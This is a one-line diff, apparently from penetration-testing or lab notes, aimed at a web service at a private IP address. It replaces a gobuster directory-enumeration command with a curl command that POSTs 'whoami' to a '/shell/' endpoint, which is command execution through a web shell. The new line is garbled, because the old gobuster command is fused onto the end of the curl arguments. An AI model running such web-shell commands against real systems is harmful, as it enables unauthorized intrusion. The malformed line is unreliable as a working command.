@@ -1,1 +1,1 @@
-gobuster dir -u http://172.17.17.118:8080 -w /usr/share/wordlists/dirb/common.txt
+printf "whoami\n" | curl -X POST http://172.17.17.118:8080/shell/ --data-binary @-gobuster dir -u http://172.17.17.118:8080 -w /usr/share/wordlists/dirb/common.txt
